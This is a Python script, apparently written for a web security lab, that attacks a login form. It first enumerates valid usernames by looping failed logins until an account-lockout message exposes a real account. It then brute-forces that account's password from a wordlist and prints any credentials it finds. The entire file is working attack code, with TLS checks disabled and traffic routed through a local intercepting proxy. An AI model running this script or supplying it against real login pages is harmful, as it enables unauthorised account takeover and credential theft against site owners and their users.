#!/usr/bin/env python3
# Username enumeration via account lock
# -------------------------------------
# Kinda confusing lol
import requests
import sys

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def user_list(url, user_path):
    with open(user_path, 'r') as f:
        for users in f.readlines():
            user = users.replace('\n','')
            data = {'username':user, 'password':'wrongpassword'}
            req = requests.post(url, data=data, verify=False, proxies=p)
            if "Invalid username or password." not in req.text:
                return user
            continue
        return False

def pass_list(url, user, pass_path):
    with open(pass_path, 'r') as f:
        for passwords in f.readlines():
            password = passwords.replace('\n','')
            data = {'username':user, 'password':password}
            req = requests.post(url, data=data, verify=False, proxies=p)
            if "Invalid username or password." not in req.text and "You have made too many incorrect login attempts." not in req.text:
                return password
            continue
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        username = sys.argv[2].strip()
        password = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: {} <url> <username> <password>".format(sys.argv[0]))
        print("[-] Example: {} http://example.com admin password".format(sys.argv[0]))
        sys.exit(1)
   
    print("[+] Enumerate the username...")
    for i in range(10):
        user = user_list(url, username)
        if user:
            print("[-] Found the username...    [{}]".format(user))
            print("[+] Enumerate the password...")
            passwd = pass_list(url, user, password)
            if passwd:
                print("[-] Found the password...    [{}]".format(passwd))
                break